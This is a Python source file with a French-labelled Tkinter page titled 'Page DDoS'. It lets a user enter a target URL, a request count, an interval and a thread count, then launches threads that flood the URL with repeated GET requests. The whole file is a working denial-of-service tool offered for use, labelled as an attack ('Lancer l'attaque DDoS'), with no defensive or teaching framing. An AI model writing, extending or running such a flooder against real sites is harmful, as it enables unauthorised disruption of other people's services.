import tkinter as tk
import requests
from threading import Thread
import time

class DdosPage(tk.Frame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        labelAttack = tk.Label(self, text="Page DDoS", font=("Arial", 16))
        labelAttack.pack(pady=20)
        
        tk.Label(self, text="URL cible :").pack(pady=5)
        self.url_entry = tk.Entry(self, width=40)
        self.url_entry.pack(pady=10)
        
        tk.Label(self, text="Nombre de requêtes :").pack(pady=5)
        self.nbRequestsVar = tk.StringVar(value="100")
        nbRequestsDropdown = tk.OptionMenu(self, self.nbRequestsVar, "50", "100", "200", "500", "1000")
        nbRequestsDropdown.pack(pady=5)
        
        tk.Label(self, text="Intervalle entre requêtes (secondes) :").pack(pady=5)
        self.requestsInterval = tk.Entry(self, width=10)
        self.requestsInterval.insert(0, "0.1")  # Intervalle par défaut
        self.requestsInterval.pack(pady=5)
        
        tk.Label(self, text="Nombre de threads :").pack(pady=5)
        self.threadsEntry = tk.Entry(self, width=10)
        self.threadsEntry.insert(0, "1")  # Nombre de threads par défaut
        self.threadsEntry.pack(pady=5)
        
        self.start_button = tk.Button(self, text="Lancer l'attaque DDoS", command=self.start_attack)
        self.start_button.pack(pady=10)
        
        self.status_label = tk.Label(self, text="")
        self.status_label.pack(pady=10)
    
    def start_attack(self):
        url = self.url_entry.get()
        numRequests = int(self.nbRequestsVar.get())
        interval = float(self.requestsInterval.get())
        numThreads = int(self.threadsEntry.get())
        
        if url:
            self.status_label.config(text="Lancement en cours...")
            # On attaque autant de fois qu'il y a de nombre de threads
            for _ in range(numThreads):
                thread = Thread(target=self.ddos_attack, args=(url, numRequests, interval))
                thread.start()
    
    def ddos_attack(self, url, num_requests, interval):
        try:
            for _ in range(num_requests):
                requests.get(url)
                time.sleep(interval)  # Pause entre les requêtes
            self.status_label.config(text="Attaque terminée !")
        except Exception as e:
            self.status_label.config(text=f"Erreur : {e}")
            